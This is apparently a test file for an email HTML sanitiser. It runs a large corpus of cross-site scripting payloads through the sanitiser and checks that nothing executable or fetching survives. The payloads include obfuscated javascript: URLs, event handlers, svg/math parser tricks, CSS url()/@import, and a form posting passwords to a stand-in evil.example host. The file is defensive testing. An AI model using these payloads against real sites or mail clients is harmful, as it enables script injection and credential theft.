/**
 * The mail sanitiser (mail/sanitize.ts, docs/mail-design.md §7) against a hostile corpus: script, on* handlers,
 * javascript: in all its spellings, meta refresh, base, forms, svg and math, url() and @import, srcset, and the
 * encoded and parser tricks. Every output is parsed again and checked against the allowlist, so a case passes only
 * if nothing that can run or fetch survives, however it was spelled.
 */
import { describe, expect, test } from 'bun:test';
import { hostsDiffer, shownHost } from '@dither-chat/protocol';
import { messageHtml, quotedHtml } from '../src/mail/compose.ts';
import { hasTextPart } from '../src/mail/parts.ts';
import { decodeEntities, isTracker, mailDocument, plainStyle, quoteFragment, safeHref, sanitizeCss, sanitizeMail, type SanitizeOpts } from '../src/mail/sanitize.ts';
import { htmlText } from '../src/mail/store.ts';

const PROXY = (u: string) => `/api/mail/img/T.${Buffer.from(u).toString('base64url')}.SIG`;
const CID = (c: string) => `/api/mail/messages/mml_X/cid/${encodeURIComponent(c)}`;
const clean = (html: string, o: Partial<SanitizeOpts> = {}) => sanitizeMail(html, { images: 'block', proxy: PROXY, cid: CID, ...o });

const ALLOWED_TAGS = new Set(
  'a abbr address article aside b bdi bdo big blockquote br caption center cite code col colgroup dd del details dfn div dl dt em figcaption figure font footer h1 h2 h3 h4 h5 h6 header hr i img ins kbd li main mark nav ol p pre q rp rt ruby s samp section small span strike strong sub summary sup table tbody td tfoot th thead time tr tt u ul var wbr style'.split(
    ' ',
  ),
);
const URL_ATTRS = new Set(['href', 'src', 'background']);

/** Parses the output again and lists everything that should not be there. */
function audit(html: string): string[] {
  const bad: string[] = [];
  let css = '';
  new HTMLRewriter()
    .onDocument({ comments: () => void bad.push('a comment'), doctype: () => void bad.push('a doctype') })
    .on('*', {
      element(el) {
        if (!ALLOWED_TAGS.has(el.tagName)) bad.push(`<${el.tagName}>`);
        for (const [n, v] of el.attributes) {
          if (/^on/i.test(n)) bad.push(`${n}=`);
          if (['name', 'srcset', 'ping', 'formaction', 'action', 'xlink:href', 'srcdoc', 'data', 'http-equiv'].includes(n)) bad.push(`${n}=`);
          const d = decodeEntities(v);
          if (URL_ATTRS.has(n) && !/^(https?:\/\/|mailto:|#|\/api\/mail\/(img|messages)\/|data:image\/(png|gif|jpe?g|webp|bmp|avif);base64,)/i.test(d)) bad.push(`${n}=${d.slice(0, 40)}`);
          if (URL_ATTRS.has(n) && n !== 'href' && /^https?:/i.test(d)) bad.push(`remote ${n}`);
          if (n === 'style') css += d + '\n';
          if (/(java|vb)script:/i.test(d.replace(/[\s\u0000]/g, ''))) bad.push(`${n} has a script: URL`);
        }
      },
    })
    .on('style', { text: (t) => void (css += t.text) })
    .transform(html);
  for (const m of css.matchAll(/url\s*\(\s*["']?([^"')]*)/gi)) if (!/^\/api\/mail\/(img|messages)\//.test(m[1])) bad.push(`css url(${m[1].slice(0, 40)})`);
  if (/@import|expression\s*\(|behavior\s*:|-moz-binding|image-set\s*\(|@font-face/i.test(css)) bad.push('css that fetches or runs');
  if (/<script|<iframe|<object|<embed|<svg|<math|<meta|<base|<form|<link/i.test(html)) bad.push('a forbidden tag in the text');
  return bad;
}

/** [what, html]: each must come out with nothing to run and nothing to fetch. */
const CORPUS: [string, string][] = [
  ['script', '<p>hi</p><script>alert(1)</script>'],
  ['script, upper case and src', '<SCRIPT SRC=//evil.example/x.js></SCRIPT><p>ok</p>'],
  ['script split by another', '<scr<script>ipt>alert(1)</script>'],
  ['onerror', '<img src=x onerror=alert(1)>'],
  ['onerror, mixed case and spaces', '<img src="https://e.example/a.png" OnErRoR = "alert(1)">'],
  ['onerror, slash-separated', '<img/src=x/onerror=alert(1)>'],
  ['body onload', '<body onload="alert(1)"><p>x</p></body>'],
  ['every on* on a div', '<div onclick=a() onmouseover=b() onfocus=c() onanimationstart=d() tabindex=1>x</div>'],
  ['a duplicate href', '<a href="https://ok.example/" href="javascript:alert(1)">x</a>'],
  ['javascript: href', '<a href="javascript:alert(1)">x</a>'],
  ['javascript: in mixed case', '<a href="JaVaScRiPt:alert(1)">x</a>'],
  ['javascript: with a leading space and control characters', '<a href=" \u0001javascript:alert(1)">x</a>'],
  ['javascript: with a tab inside', '<a href="java\tscript:alert(1)">x</a>'],
  ['javascript: with an encoded tab', '<a href="java&#x09;script:alert(1)">x</a>'],
  ['javascript: with &Tab; and &NewLine;', '<a href="jav&Tab;ascript&NewLine;:alert(1)">x</a>'],
  ['javascript: decimal entities', '<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)">x</a>'],
  ['javascript: hex entities, no semicolons', '<a href="&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A;alert(1)">x</a>'],
  ['javascript: padded entities', '<a href="&#0000106;avascript:alert(1)">x</a>'],
  ['javascript&colon;', '<a href="javascript&colon;alert(1)">x</a>'],
  ['javascript: with a NUL', '<a href="java\u0000script:alert(1)">x</a>'],
  ['vbscript:', '<a href="vbscript:msgbox(1)">x</a>'],
  ['data: text/html link', '<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">x</a>'],
  ['percent-encoded scheme', '<a href="%6Aavascript:alert(1)">x</a>'],
  ['javascript: as img src', '<img src="javascript:alert(1)">'],
  ['meta refresh', '<meta http-equiv="refresh" content="0;url=https://evil.example/"><p>x</p>'],
  ['meta refresh to javascript:', '<META HTTP-EQUIV="Refresh" CONTENT="0;URL=javascript:alert(1)">'],
  ['base', '<base href="https://evil.example/"><a href="x">x</a>'],
  ['form and controls', '<form action="https://evil.example/steal" method=post><input name=pw type=password><textarea>t</textarea><select><option>o</option></select><button formaction="javascript:alert(1)">Go</button></form>'],
  ['svg onload', '<svg onload=alert(1)><circle r=4 /></svg>'],
  ['svg with script', '<svg><script>alert(1)</script></svg>'],
  ['svg link', '<svg><a xlink:href="javascript:alert(1)"><text>x</text></a></svg>'],
  ['svg style breaking out', '<svg><style><img src=x onerror=alert(1)></style></svg>'],
  ['math namespace confusion', '<math><mtext><table><mglyph><style><img src=x onerror=alert(1)></style></mglyph></table></mtext></math>'],
  ['math href', '<math href="javascript:alert(1)">x</math>'],
  ['iframe and srcdoc', '<iframe src="https://evil.example/" srcdoc="<script>alert(1)</script>"></iframe>'],
  ['object, embed, applet', '<object data="https://evil.example/x.swf"><param name=a value=b></object><embed src="https://evil.example/x"><applet code=x></applet>'],
  ['link stylesheet', '<link rel="stylesheet" href="https://evil.example/x.css"><p>x</p>'],
  ['template', '<template><img src=x onerror=alert(1)></template>'],
  ['noscript title trick', '<noscript><p title="</noscript><img src=x onerror=alert(1)>"></p></noscript>'],
  ['textarea holding markup', '<textarea><img src=x onerror=alert(1)></textarea>'],
  ['title holding markup', '<title><img src=x onerror=alert(1)></title>'],
  ['xmp, noembed, noframes', '<xmp><img src=x onerror=alert(1)></xmp><noembed><img src=x onerror=alert(1)></noembed><noframes><img src=x onerror=alert(1)></noframes>'],
  ['plaintext', '<p>before</p><plaintext><img src=x onerror=alert(1)>'],
  ['a comment hiding a tag', '<!--><img src=x onerror=alert(1)>-->'],
  ['a conditional comment', '<!--[if gte mso 9]><script>alert(1)</script><![endif]--><p>x</p>'],
  ['CDATA', '<![CDATA[><img src=x onerror=alert(1)>]]>'],
  ['a processing instruction', '<?xml version="1.0"?><p>x</p>'],
  ['style @import', '<style>@import url(https://evil.example/x.css); @import "https://evil.example/y.css"; p{color:red}</style>'],
  ['style url()', '<style>body{background:url(https://evil.example/bg.png)} .a{background-image:URL( "https://evil.example/a.png" )}</style>'],
  ['style closed inside a string', '<style>a{content:"</style><img src=x onerror=alert(1)>"}</style>'],
  ['style with a comment opener', '<style><!-- p{color:red} --></style>'],
  ['style @font-face', "<style>@font-face{font-family:x;src:url(https://evil.example/f.woff)}</style>"],
  ['style attribute url()', '<p style="background-image:url(https://evil.example/x.png)">x</p>'],
  ['style attribute url() with entities', '<p style="background:url&#40;https://evil.example/x.png&#41;">x</p>'],
  ['style attribute with escaped letters', '<p style="background:u\\72l(https://evil.example/x.png)">x</p><p style="background:\\75 \\72 \\6c (https://evil.example/y.png)">y</p>'],
  ['style attribute with a comment inside url', '<p style="background:ur/**/l(https://evil.example/x.png)">x</p>'],
  ['style expression()', '<p style="width:expression(alert(1))">x</p>'],
  ['style behavior and -moz-binding', '<p style="behavior:url(x.htc);-moz-binding:url(https://evil.example/x.xml#x)">x</p>'],
  ['style image-set()', '<p style="background-image:image-set(\'https://evil.example/a.png\' 1x)">x</p><p style="background:-webkit-image-set(\'https://e.example/b.png\' 2x)">y</p>'],
  ['style javascript:', '<p style="background:url(javascript:alert(1))">x</p>'],
  ['srcset', '<img src="https://e.example/a.png" srcset="https://evil.example/b.png 2x" width="300" height="100">'],
  ['picture and source', '<picture><source srcset="https://evil.example/a.webp"><img src="https://e.example/a.png" width=300 height=100></picture>'],
  ['background attribute', '<table background="https://evil.example/bg.png"><tr><td background="https://evil.example/td.png">x</td></tr></table>'],
  ['protocol-relative image', '<img src="//evil.example/x.png" width=300 height=100>'],
  ['data:image/svg+xml', '<img src="data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+">'],
  ['data:text/html image', '<img src="data:text/html,<script>alert(1)</script>">'],
  ['name clobbering', '<img name="querySelector" src="cid:a"><a name="body" href="#x">x</a>'],
  ['ping and target', '<a href="https://ok.example/" ping="https://evil.example/ping" target="_top">x</a>'],
  ['audio, video, track', '<video src="https://evil.example/v.mp4" poster="https://evil.example/p.png"><track src=x></video><audio src="https://evil.example/a.mp3"></audio>'],
  ['dialog and portal', '<dialog open>x</dialog><portal src="https://evil.example/"></portal>'],
  ['image tag (read as img)', '<image src="https://evil.example/x.png" onerror=alert(1)>'],
  ['an unclosed tag at the end', '<p>x</p><img src=x onerror=alert(1)//'],
  ['an attribute with > in it', '<a title=">" onmouseover=alert(1) href="https://ok.example/">x</a>'],
  ['entity-encoded markup stays text', '&lt;script&gt;alert(1)&lt;/script&gt;'],
  ['our own classes', '<div class="dc-folded dc-quote x">x</div>'],
  ['frameset', '<frameset><frame src="https://evil.example/"></frameset>'],
];

describe('the hostile corpus', () => {
  for (const [what, html] of CORPUS)
    test(what, () => {
      for (const images of ['block', 'proxy', 'drop'] as const) {
        const out = clean(html, { images }).html;
        expect({ images, bad: audit(out) }).toEqual({ images, bad: [] });
        expect(out).not.toMatch(/<[^>]*\son\w+\s*=/i);
      }
      // The whole document as served: the same, with our own head.
      const doc = mailDocument(clean(html));
      expect(doc.match(/<script/gi)).toBeNull();
    });

  test('the attack text itself is gone, not just made inert', () => {
    for (const html of ['<script>alert(1)</script>', '<svg><script>alert(1)</script></svg>', '<template><b>t</b></template>', '<textarea><b>t</b></textarea>'])
      expect(clean(`<p>keep</p>${html}`).html).toBe('<p>keep</p>');
  });

  test('entity-encoded markup stays escaped text', () => {
    expect(clean('&lt;script&gt;alert(1)&lt;/script&gt;').html).toBe('&lt;script&gt;alert(1)&lt;/script&gt;');
  });

  test('our own classes cannot be put on by the mail', () => {
    expect(clean('<div class="dc-folded dc-quote x">x</div>').html).toBe('<div class="x">x</div>');
  });
});

describe('what stays', () => {
  test('ordinary markup keeps its look', () => {
    const html = '<table width="600" cellpadding="4" bgcolor="#fafafa" align="center"><tr><td valign="top" style="color:#333;font-family:Georgia,serif;padding:8px">Hi <b>there</b>, <font color="red" face="Arial">see</font> <a href="https://shop.example/x?a=1&amp;b=2">this</a>.</td></tr></table>';
    expect(clean(html).html).toBe(
      '<table width="600" cellpadding="4" bgcolor="#fafafa" align="center"><tr><td valign="top" style="color:#333;font-family:Georgia,serif;padding:8px">Hi <b>there</b>, <font color="red" face="Arial">see</font> <a href="https://shop.example/x?a=1&amp;b=2" target="_blank" rel="noopener noreferrer">this</a>.</td></tr></table>',
    );
  });

  test('mailto and in-mail anchors stay', () => {
    const out = clean('<a href="mailto:sam@lee.example?subject=Hi">mail</a> <a href="#part2">down</a>').html;
    expect(out).toContain('href="mailto:sam@lee.example?subject=Hi"');
    expect(out).toContain('href="#part2"');
  });

  test('relative links lose their href (they would point at the hub)', () => {
    expect(clean('<a href="/api/mail">x</a><a href="page.html">y</a>').html).toBe('<a target="_blank" rel="noopener noreferrer">x</a><a target="_blank" rel="noopener noreferrer">y</a>');
  });

  test('the mail\u2019s own style sheet stays, without what fetches', () => {
    const out = clean('<style>@media (max-width:600px){.a{width:100%!important}} p > b{color:red} .h{background:url(https://e.example/h.png)}</style>').html;
    expect(out).toContain('@media (max-width:600px){.a{width:100%!important}}');
    expect(out).toContain('p > b{color:red}');
    expect(out).toContain('.h{background:none}');
  });

  test('style sheets go from a reply\u2019s quote', () => {
    expect(clean('<style>p{color:red}</style><p>x</p>', { styles: false }).html).toBe('<p>x</p>');
  });

  test('the body\u2019s colours go to the wrapper', () => {
    const s = clean('<body bgcolor="#f3efe6" text="#222" style="margin:0;background:url(https://e.example/bg.png)" onload=x()><p>x</p></body>');
    expect(s.body).toEqual({ bgcolor: '#f3efe6', text: '#222', style: 'margin:0;background:none' });
    expect(mailDocument(s)).toContain('<div class="dc-mail" style="background-color:#f3efe6;color:#222;margin:0;background:none"><p>x</p></div>');
  });
});

describe('images', () => {
  const html = '<img src="https://img.example/logo.png" width="200" height="50" alt="Logo"><img src="https://t.example/o.gif" width="1" height="1"><img src="cid:logo@x" alt="">';

  test('blocked: a placeholder of the same size, counted; the tracker gone; alt text escaped', () => {
    expect(clean('<img src="https://e.example/a.png" width="10" height="20" alt=\'"><script>x</script>\'>').html).toBe('<span class="dc-img-blocked" role="img" aria-label="&quot;&gt;&lt;script&gt;x&lt;/script&gt;" title="&quot;&gt;&lt;script&gt;x&lt;/script&gt;" style="width:10px;aspect-ratio:10/20"></span>');
    const s = clean(html);
    expect(s.remoteImages).toBe(1);
    expect(s.trackers).toBe(1);
    expect(s.html).toBe('<span class="dc-img-blocked" role="img" aria-label="Logo" title="Logo" style="width:200px;aspect-ratio:200/50"></span><img src="/api/mail/messages/mml_X/cid/logo%40x" alt="">');
    expect(s.cids).toEqual(['logo@x']);
  });

  test('allowed: through the proxy; the tracker still gone', () => {
    const s = clean(html, { images: 'proxy' });
    expect(s.remoteImages).toBe(0);
    expect(s.trackers).toBe(1);
    expect(s.html).toContain(`src="${PROXY('https://img.example/logo.png')}"`);
    expect(s.html).not.toContain('t.example');
  });

  test('a reply\u2019s quote: no images at all', () => {
    expect(clean(html, { images: 'drop', cid: undefined }).html).toBe('');
  });

  test('CSS images count as remote images, and go through the proxy when allowed', () => {
    expect(clean('<p style="background:url(https://e.example/a.png)">x</p>').remoteImages).toBe(1);
    expect(clean('<p style="background:url(https://e.example/a.png)">x</p>', { images: 'proxy' }).html).toContain(`url(&quot;${PROXY('https://e.example/a.png')}&quot;)`);
  });

  test('plain data: images stay; others go', () => {
    expect(clean('<img src="data:image/png;base64,iVBORw0KGgo=">').html).toBe('<img src="data:image/png;base64,iVBORw0KGgo=">');
    expect(clean('<img src="data:image/svg+xml;base64,PHN2Zz4=">').html).toBe('');
  });

  test('trackers: by size, and by style', () => {
    expect(isTracker('1', '1', '')).toBe(true);
    expect(isTracker('2', null, '')).toBe(true);
    expect(isTracker(null, null, 'width:1px;height:1px')).toBe(true);
    expect(isTracker('600', '400', 'display:none')).toBe(true);
    expect(isTracker('600', '400', 'visibility: hidden')).toBe(true);
    expect(isTracker('600', '1', '')).toBe(false); // a divider line
    expect(isTracker(null, null, '')).toBe(false);
    expect(isTracker('100%', null, '')).toBe(false);
  });
});

describe('quotes', () => {
  test('the marks mail clients leave get dc-quote', () => {
    const s = clean(
      '<p>new</p><div class="gmail_quote"><blockquote>old</blockquote></div><blockquote type="cite">apple</blockquote><div class="protonmail_quote">p</div><div class="yahoo_quoted">y</div><div class="moz-cite-prefix">On \u2026</div><div id="divRplyFwdMsg">From: x</div>',
    );
    expect(s.quotes).toBe(6);
    expect(s.html).toContain('<div class="gmail_quote dc-quote">');
    expect(s.html).toContain('<blockquote type="cite" class="dc-quote">');
    expect(s.html).toContain('<div id="divRplyFwdMsg" class="dc-quote" data-dc-quote="rest">');
  });

  test('a reply\u2019s quote (slice 5, compose.ts quotedHtml): the original\u2019s HTML, no images, style sheets or script', () => {
    expect(quoteFragment('<style>p{color:red}</style><p>Are you free <b>Friday</b>?</p><img src="https://e.example/x.png"><img src="data:image/png;base64,iVBORw0KGgo="><img src="cid:a@b"><script>x</script>')).toBe('<p>Are you free <b>Friday</b>?</p>');
    const o = { from: { name: 'Sam', email: 'sam@lee.example' }, to: [], cc: [], replyTo: [], subject: 'Hi', date: Date.UTC(2026, 10, 3, 10), text: 'Are you free Friday?', html: '<p onclick="x()">Are you free <b>Friday</b>?</p><script>alert(1)</script>' };
    const reply = messageHtml('reply', 'Yes!', o, true, 'UTC');
    expect(reply).toContain('<blockquote type="cite"');
    expect(reply).toContain('<p>Are you free <b>Friday</b>?</p></blockquote>');
    expect(reply).not.toMatch(/<script|onclick/);
    expect(messageHtml('forward', '', o, true, 'UTC')).toContain('<p>Are you free <b>Friday</b>?</p></div>');
    expect(quotedHtml(null)).toBeNull();
    // Nothing left of it: the text is quoted instead.
    expect(quotedHtml('<script>x</script>')).toBeNull();
  });
});

describe('plain or styled (which part the reader shows)', () => {
  const sam = { from: { name: 'Sam Rivera', email: 'sam@rivera.example' }, to: [], cc: [], replyTo: [], subject: 'Dinner on Friday?', date: Date.UTC(2026, 10, 3, 10), text: 'Are you free after 7?\n> on Friday\nhttps://ramen.example/menu' };
  test('plain: a reply sent from here, with its quote and a link', () => {
    const html = messageHtml('reply', 'See you at 7:30!\nhttps://ramen.example/menu', sam, true, 'UTC');
    expect(clean(html).plain).toBe(true);
    // A forward too, and the same with no quote.
    expect(clean(messageHtml('forward', 'For you', sam, true, 'UTC')).plain).toBe(true);
    expect(clean(messageHtml('reply', 'Yes', sam, false, 'UTC')).plain).toBe(true);
  });

  test('plain: what mail apps send for a few lines of text', () => {
    for (const html of [
      // Gmail, with its quote and signature
      '<div dir="ltr">See you at 7:30!<div><br></div><div>Zyan</div></div><br><div class="gmail_quote"><div dir="ltr" class="gmail_attr">On Tue, Sam wrote:<br></div><blockquote class="gmail_quote" style="margin:0px 0px 0px 0.8ex;border-left:1px solid rgb(204,204,204);padding-left:1ex">Are you free?</blockquote></div><div dir="ltr" class="gmail_signature" data-smartmail="gmail_signature">Zyan</div>',
      // Apple Mail
      '<html><head><meta http-equiv="content-type" content="text/html; charset=utf-8"></head><body style="overflow-wrap: break-word; -webkit-nbsp-mode: space; line-break: after-white-space;"><div dir="auto">Yes <b>7:30</b>, <i>see you</i>.</div><blockquote type="cite"><div>Are you free?</div></blockquote></body></html>',
      // Thunderbird, with a list and a link
      '<p>Two things:</p><ul><li>the <a href="https://ramen.example/">menu</a></li><li>the time</li></ul><ol start="3"><li>three</li></ol><div class="moz-cite-prefix">On 11/3/26, Sam wrote:<br></div><blockquote type="cite" cite="mid:x@y">old</blockquote>',
      '<p><strong>Bold</strong> and <em>italic</em>, a line<br>break and <span>a span</span>.</p>',
      'Just text, no markup at all.',
    ])
      expect(clean(html).plain, html.slice(0, 60)).toBe(true);
  });

  test('styled: images, tables, colours, backgrounds, fonts, headings, alignment, style sheets', () => {
    for (const html of [
      '<p>Hi</p><img src="https://e.example/banner.png" width="600" height="200">',
      '<p>Hi</p><img src="cid:logo@x">',
      '<p>Hi</p><img src="https://t.example/o.gif" width="1" height="1">',
      '<table width="600"><tr><td>Hi</td></tr></table>',
      '<p style="color:#333">Hi</p>',
      '<div style="background:#f6f8fa">Hi</div>',
      '<div style="background-image:url(https://e.example/bg.png)">Hi</div>',
      '<div style="font-family:Arial, sans-serif; font-size:14px">Hi</div>',
      '<span style="font-weight:bold">Hi</span>',
      '<font face="Arial" color="red">Hi</font>',
      '<h1>Hi</h1>',
      '<p align="center">Hi</p>',
      '<center>Hi</center>',
      '<hr><p>Hi</p>',
      '<pre>Hi</pre>',
      '<u>Hi</u>',
      '<style>p{color:red}</style><p>Hi</p>',
      '<html><head><link rel="stylesheet" href="https://e.example/s.css"></head><body><p>Hi</p></body></html>',
      '<body bgcolor="#eeeeee"><p>Hi</p></body>',
      '<p>Hi<script>alert(1)</script></p>',
      '<p>Hi</p><custom-box>x</custom-box>',
      '<div style="border-left:3px solid red">not a quote</div>',
    ])
      expect(clean(html).plain, html.slice(0, 60)).toBe(false);
  });

  test('plainStyle: spacing and wrapping, and a quote’s bar only on a blockquote', () => {
    expect(plainStyle('div', 'margin:0 0 0 .8ex; padding-left:1ex')).toBe(true);
    expect(plainStyle('blockquote', 'margin:0 0 0 .8ex;border-left:1px solid #ccc;padding-left:1ex')).toBe(true);
    expect(plainStyle('div', 'border-left:1px solid #ccc')).toBe(false);
    expect(plainStyle('p', 'margin:0; color: red')).toBe(false);
    expect(plainStyle('p', 'x-blocked: none')).toBe(false);
  });

  test('a text part: its own, not the text made from the HTML, and not a stub', () => {
    const html = '<div dir="ltr">See you at 7:30!</div><blockquote type="cite">Are you free after 7 on Friday?</blockquote>';
    expect(hasTextPart({ text: 'See you at 7:30!\n\n> Are you free after 7 on Friday?', html })).toBe(true);
    // An HTML-only mail: the hub kept htmlText of it as its text (store.ts putBody).
    expect(hasTextPart({ text: htmlText(html), html })).toBe(false);
    expect(hasTextPart({ text: null, html })).toBe(false);
    expect(hasTextPart({ text: '  \n', html })).toBe(false);
    expect(hasTextPart({ text: 'Open it in a browser.', html: `<p>${'A long letter. '.repeat(20)}</p>` })).toBe(false);
    expect(hasTextPart({ text: 'Hi', html: null })).toBe(false);
  });
});

describe('links whose text names another site', () => {
  test('found, with the real host', () => {
    const s = clean('<a href="https://evil.example/login">paypal.com</a> <a href="https://www.paypal.com/x">https://paypal.com/</a> <a href="https://help.paypal.com/">paypal.com</a> <a href="https://x.example/">Click here</a>');
    expect(s.mismatched).toEqual([{ shown: 'paypal.com', goes: 'evil.example' }]);
  });

  test('shownHost and hostsDiffer', () => {
    expect(shownHost('paypal.com')).toBe('paypal.com');
    expect(shownHost(' https://www.Bank.example/login ')).toBe('www.bank.example');
    expect(shownHost('report.pdf')).toBeNull();
    expect(shownHost('Click here')).toBeNull();
    expect(shownHost('www.example.zip')).toBe('www.example.zip');
    expect(hostsDiffer('paypal.com', 'www.paypal.com')).toBe(false);
    expect(hostsDiffer('paypal.com', 'help.paypal.com')).toBe(false);
    expect(hostsDiffer('paypal.com', 'paypal.com.evil.example')).toBe(true);
    expect(hostsDiffer('paypal.com', 'xn--pypal-4ve.com')).toBe(true);
  });
});

describe('the pieces', () => {
  test('decodeEntities: numeric, named, legacy without semicolons, and what it does not know', () => {
    expect(decodeEntities('a&amp;b&#x41;&#66;&colon;&Tab;&lt&nbsp;')).toBe('a&bAB:\t<\u00a0');
    expect(decodeEntities('&#0;&#xD800;&#x110000;')).toBe('\ufffd\ufffd\ufffd');
    expect(decodeEntities('&unknown; &amp')).toBe('&unknown; &');
  });

  test('safeHref', () => {
    expect(safeHref('https://a.example/x y')).toBe('https://a.example/x%20y');
    expect(safeHref('HTTPS://A.example')).toBe('https://a.example/');
    expect(safeHref('//cdn.example/x')).toBe('https://cdn.example/x');
    expect(safeHref('https://user:pw@a.example/')).toBeNull();
    expect(safeHref('ftp://a.example/')).toBeNull();
    expect(safeHref('#a b')).toBeNull();
    expect(safeHref('mailto:a@b.example')).toBe('mailto:a@b.example');
  });

  test('sanitizeCss leaves no `<` and nothing that fetches', () => {
    const r = sanitizeCss('a{content:"</style>"} b{background:url(https://e.example/x)} @import "x.css"; c{x:expression(1)}');
    expect(r.css).not.toContain('<');
    expect(r.css).not.toMatch(/url\(|@import|expression\(/i);
    expect(r.remote).toBe(1);
  });
});

describe('the end of the input', () => {
  test('a tag left open at the end goes, so the markup after it cannot close it', () => {
    for (const tail of ['<img src=x onerror=alert(1)//', '<img src=x title="<b>" onerror=alert(1)//', '<a href="https://ok.example/ title=\'>\'', '<img src=x onerror=1 /', '</p', '<!DOCTYPE html']) {
      const s = clean(`<p>x</p>${tail}`);
      expect(s.html).toBe('<p>x</p>');
      expect(mailDocument(s)).toContain('<div class="dc-mail"><p>x</p></div>');
    }
  });

  test('what closes stays', () => {
    expect(clean('<p>a<3 b</p>').html).toBe('<p>a<3 b</p>');
    expect(clean('<p title="a>b">x</p>').html).toBe('<p title="a>b">x</p>');
    expect(clean('<style>p{color:red}</style><p>x</p>').html).toBe('<style>p{color:red}</style><p>x</p>');
    expect(clean('<p>x</p><').html).toBe('<p>x</p><');
  });
});

test('a style end tag with a space, then a tag left open', () => {
  expect(clean('<style>p{color:red}</style ><p>x</p><img src=x onerror=1').html).toBe('<style>p{color:red}</style ><p>x</p>');
});
